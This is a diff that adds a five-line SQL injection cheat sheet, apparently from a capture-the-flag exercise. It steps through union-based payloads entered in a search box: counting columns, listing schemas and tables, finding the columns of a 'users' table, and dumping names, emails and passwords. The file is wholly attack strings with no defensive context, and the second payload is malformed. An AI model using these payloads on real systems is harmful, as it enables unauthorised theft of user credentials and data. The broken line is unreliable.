@@ -1,0 +1,9 @@
+Get number of columns --> Search' order by 5 -- -
+
+Get columns names --> Search' union select 1,2,3,4,5 schema_name from information_schema.schemata -- -
+
+Get tables --> Search' union select 1,2,3,4,table_name from information_schema.tables where table_schema='ctf' -- -
+
+Get fields in the user table --> Search' union select 1,column_name,3,4,5 from information_schema.columns where table_name='users' -- -
+
+Get data from users table --> Search' union select id,name,email,password,created_at from users -- -
